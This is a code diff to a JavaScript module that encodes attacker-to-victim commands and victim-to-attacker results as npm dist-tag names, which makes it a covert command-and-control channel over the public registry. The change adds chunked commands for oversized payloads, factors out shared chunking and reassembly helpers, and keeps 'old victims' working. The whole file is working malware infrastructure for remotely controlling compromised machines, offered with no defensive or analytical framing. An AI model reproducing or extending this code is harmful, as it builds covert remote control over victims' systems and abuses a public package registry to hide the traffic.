@@ -2,6 +2,8 @@
 //
 // Tag grammar (see docs/protocol.md):
 //   command:  x-cmd-<agentId>-<seq>-<base64url(JSON)>
+//   command (oversized, chunked):
+//             x-cmd-<agentId>-<seq>-<chunk>of<total>-<base64url(JSON-chunk)>
 //   result:   x-res-<agentId>-<seq>-<chunk>of<total>-<base64url(JSON-chunk)>
 //   announce: x-ann-<agentId>-<base64url(JSON)>   (victim -> attacker hello)
 //
@@ -14,6 +16,9 @@
 // - npm caps dist-tag names at 214 characters; the encoder enforces this.
 // - agentId may only contain [A-Za-z0-9_] so the '-' separated grammar stays
 //   unambiguous (a base64url payload itself may contain '-').
+// - Commands that fit keep the legacy single-tag format, so old victims keep
+//   working; only oversized payloads use the chunked form. Old victims fail
+//   to decode chunk tags and skip them — they never execute a partial command.
 
 export const PINNED_VERSION = '1.0.0';
 export const MAX_TAG_LEN = 214;
@@ -100,6 +105,55 @@ export function assertValidTagName(name) {
   }
 }
 
+/**
+ * Split a base64url payload into chunk strings such that each chunk tag
+ * "<fixedPrefix><i>of<total>-<chunk>" stays within MAX_TAG_LEN. The chunk
+ * spec grows with the number of digits of total, so iterate until the
+ * digit count is stable.
+ * @returns {string[]} chunks in 1-based order
+ */
+function chunkPayload(b64, fixedPrefixLen) {
+  let total = 1;
+  let chunkSize;
+  for (;;) {
+    const digits = String(total).length;
+    const overhead = fixedPrefixLen + digits + 'of'.length + digits + '-'.length;
+    chunkSize = MAX_TAG_LEN - overhead;
+    if (chunkSize < 16) {
+      throw new ProtocolError('agentId/seq too long: not enough room to chunk payload');
+    }
+    const needed = Math.max(1, Math.ceil(b64.length / chunkSize));
+    if (String(needed).length === digits) {
+      total = needed;
+      break;
+    }
+    total = needed;
+  }
+  const chunks = [];
+  for (let i = 0; i < total; i++) {
+    chunks.push(b64.slice(i * chunkSize, (i + 1) * chunkSize));
+  }
+  return chunks;
+}
+
+/** Validate and join chunk parts back into one base64url payload string. */
+function joinChunks(parts, kind) {
+  if (!Array.isArray(parts) || parts.length === 0) {
+    throw new ProtocolError(`no ${kind} chunks given`);
+  }
+  const { agentId, seq, total } = parts[0];
+  for (const p of parts) {
+    if (p.agentId !== agentId || p.seq !== seq || p.total !== total) {
+      throw new ProtocolError(`inconsistent ${kind} chunks (agentId/seq/total mismatch)`);
+    }
+  }
+  const seen = new Set(parts.map((p) => p.chunk));
+  if (seen.size !== total) {
+    throw new ProtocolError(`incomplete ${kind}: have ${seen.size} of ${total} chunks`);
+  }
+  return [...parts].sort((a, b) => a.chunk - b.chunk).map((p) => p.data).join('');
+}
+
 // ---------------------------------------------------------------------------
 // command tags (attacker -> victim)
 // ---------------------------------------------------------------------------
@@ -153,6 +207,103 @@ export function decodeCommandTag(name) {
   return { agentId, seq, payload };
 }
 
+/**
+ * Encode a command into one or more dist-tag names.
+ * Payloads that fit keep the legacy single-tag format
+ * (`x-cmd-<agentId>-<seq>-<b64>`, byte-identical to encodeCommandTag, so old
+ * victims keep working); oversized payloads are chunked 1-based:
+ * `x-cmd-<agentId>-<seq>-<chunk>of<total>-<data>`.
+ * @returns {string[]} array of tag names (all values: PINNED_VERSION)
+ */
+export function encodeCommandTags(agentId, seq, payload) {
+  validateAgentId(agentId);
+  validateSeq(seq);
+  const b64 = encodePayload(payload);
+  const prefix = `${CMD_PREFIX}${agentId}-${seq}-`;
+  const single = `${prefix}${b64}`;
+  if (single.length <= MAX_TAG_LEN) {
+    assertValidTagName(single);
+    return [single];
+  }
+  const chunks = chunkPayload(b64, prefix.length);
+  const total = chunks.length;
+  return chunks.map((chunk, i) => {
+    const name = `${prefix}${i + 1}of${total}-${chunk}`;
+    assertValidTagName(name);
+    return name;
+  });
+}
+
+/** Is this command tag one chunk of a multi-tag command? */
+export function isChunkedCommandTag(name) {
+  if (!isCommandTag(name)) return false;
+  const parts = String(name).split('-');
+  // x, cmd, agentId, seq, "<chunk>of<total>", ...data
+  return parts.length >= 6 && CHUNK_SPEC_RE.test(parts[4]);
+}
+
+/**
+ * Decode one chunked command tag.
+ * @returns {{agentId: string, seq: number, chunk: number, total: number, data: string}}
+ * @throws {ProtocolError} on malformed tags
+ */
+export function decodeCommandChunkTag(name) {
+  if (!isChunkedCommandTag(name)) {
+    throw new ProtocolError(`not a chunked command tag: "${name}"`);
+  }
+  const parts = name.split('-');
+  // x, cmd, agentId, seq, "<chunk>of<total>", ...data (data may contain '-')
+  const agentId = parts[2];
+  const seqStr = parts[3];
+  const spec = parts[4];
+  const data = parts.slice(5).join('-');
+  try {
+    validateAgentId(agentId);
+  } catch {
+    throw new ProtocolError(`malformed command chunk tag (bad agentId): "${name}"`);
+  }
+  const seq = decodeSeq(seqStr, 'command', name);
+  const m = CHUNK_SPEC_RE.exec(spec);
+  if (!B64URL_RE.test(data)) {
+    throw new ProtocolError(`malformed command chunk tag (bad payload): "${name}"`);
+  }
+  const chunk = Number(m[1]);
+  const total = Number(m[2]);
+  if (!Number.isSafeInteger(chunk) || !Number.isSafeInteger(total)) {
+    throw new ProtocolError(`malformed command chunk tag (chunk values must be safe integers): "${name}"`);
+  }
+  if (chunk < 1 || total < 2 || chunk > total) {
+    throw new ProtocolError(`malformed command chunk tag (chunk out of range): "${name}"`);
+  }
+  return { agentId, seq, chunk, total, data };
+}
+
+/**
+ * Reassemble a full command payload from decoded chunk parts.
+ * @param {Array<{agentId:string, seq:number, chunk:number, total:number, data:string}>} parts
+ * @returns {object} the decoded command payload
+ * @throws {ProtocolError} if parts are inconsistent or incomplete
+ */
+export function reassembleCommand(parts) {
+  const payload = decodePayload(joinChunks(parts, 'command'));
+  if (typeof payload !== 'object' || payload === null || typeof payload.op !== 'string') {
+    throw new ProtocolError('command payload missing "op"');
+  }
+  return payload;
+}
+
+/**
+ * Decode just the addressing (agentId + seq) of any command tag, legacy
+ * single-tag or chunked. Used for baselining and seq tracking, where the
+ * payload itself does not matter.
+ */
+export function decodeCommandHeader(name) {
+  const { agentId, seq } = isChunkedCommandTag(name)
+    ? decodeCommandChunkTag(name)
+    : decodeCommandTag(name);
+  return { agentId, seq };
+}
+
 // ---------------------------------------------------------------------------
 // result tags (victim -> attacker), chunked
 // ---------------------------------------------------------------------------
@@ -167,34 +318,13 @@ export function encodeResultTags(agentId, seq, payload) {
   validateSeq(seq);
   const b64 = encodePayload(payload);
   const fixed = `${RES_PREFIX}${agentId}-${seq}-`.length;
-
-  // The chunk spec ("<i>of<total>") grows with the number of digits of total,
-  // so iterate until the digit count is stable.
-  let total = 1;
-  let chunkSize;
-  for (;;) {
-    const digits = String(total).length;
-    const overhead = fixed + digits + 'of'.length + digits + '-'.length;
-    chunkSize = MAX_TAG_LEN - overhead;
-    if (chunkSize < 16) {
-      throw new ProtocolError('agentId/seq too long: not enough room to chunk result payload');
-    }
-    const needed = Math.max(1, Math.ceil(b64.length / chunkSize));
-    if (String(needed).length === digits) {
-      total = needed;
-      break;
-    }
-    total = needed;
-  }
-
-  const tags = [];
-  for (let i = 1; i <= total; i++) {
-    const chunk = b64.slice((i - 1) * chunkSize, i * chunkSize);
-    const name = `${RES_PREFIX}${agentId}-${seq}-${i}of${total}-${chunk}`;
+  const chunks = chunkPayload(b64, fixed);
+  const total = chunks.length;
+  return chunks.map((chunk, i) => {
+    const name = `${RES_PREFIX}${agentId}-${seq}-${i + 1}of${total}-${chunk}`;
     assertValidTagName(name);
-    tags.push(name);
-  }
-  return tags;
+    return name;
+  });
 }
 
 export function isResultTag(name) {
@@ -250,22 +380,9 @@ export function decodeResultTag(name) {
  * @throws {ProtocolError} if parts are inconsistent or incomplete
  */
 export function reassembleResult(parts) {
-  if (!Array.isArray(parts) || parts.length === 0) {
-    throw new ProtocolError('no result chunks given');
-  }
-  const { agentId, seq, total } = parts[0];
-  for (const p of parts) {
-    if (p.agentId !== agentId || p.seq !== seq || p.total !== total) {
-      throw new ProtocolError('inconsistent result chunks (agentId/seq/total mismatch)');
-    }
-  }
-  const seen = new Set(parts.map((p) => p.chunk));
-  if (seen.size !== total) {
-    throw new ProtocolError(`incomplete result: have ${seen.size} of ${total} chunks`);
-  }
-  const data = [...parts].sort((a, b) => a.chunk - b.chunk).map((p) => p.data).join('');
+  const data = joinChunks(parts, 'result');
   const payload = decodePayload(data);
-  if (!payload || typeof payload !== 'object' || payload.seq !== seq) {
+  if (!payload || typeof payload !== 'object' || payload.seq !== parts[0].seq) {
     throw new ProtocolError('result payload sequence mismatch');
   }
   return payload;
